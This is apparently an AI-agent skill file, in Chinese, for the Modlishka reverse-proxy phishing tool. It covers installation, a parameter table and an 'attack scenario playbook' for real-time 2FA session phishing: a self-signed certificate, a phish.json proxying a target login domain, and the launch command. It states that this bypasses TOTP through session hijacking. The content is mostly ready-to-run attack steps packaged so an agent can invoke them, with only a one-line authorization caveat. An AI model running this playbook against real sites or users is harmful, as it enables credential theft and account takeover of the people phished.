---
name: modlishka-reverse-proxy-phishing
description: 渗透工具 skill:Modlishka 的安装、参数速查与攻击场景 playbook。当任务涉及 钓鱼与社会工程 需要调用 Modlishka 时使用。
---

# Modlishka

- 攻击大类:C08 钓鱼与社会工程
- 上游仓库:https://github.com/drk1wi/Modlishka
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
go install github.com/drk1wi/Modlishka@latest
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `Modlishka -config phish.json` | 启动反向代理钓鱼 |
| `cert 配置` | 挂合法域名 TLS 证书 |
| `cred 捕获插件` | 自定义凭证提取正则 |

## 攻击场景 Playbook

### 2FA 会话实时钓鱼

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# phish.json: proxyDomain=login.target.com; target=accounts.target.com; cert/key 指向上面文件
Modlishka -config phish.json
```

## 注意事项

反代式钓鱼可实时绕过 TOTP(会话劫持而非凭证复用);务必持有目标域名与合法用途授权。
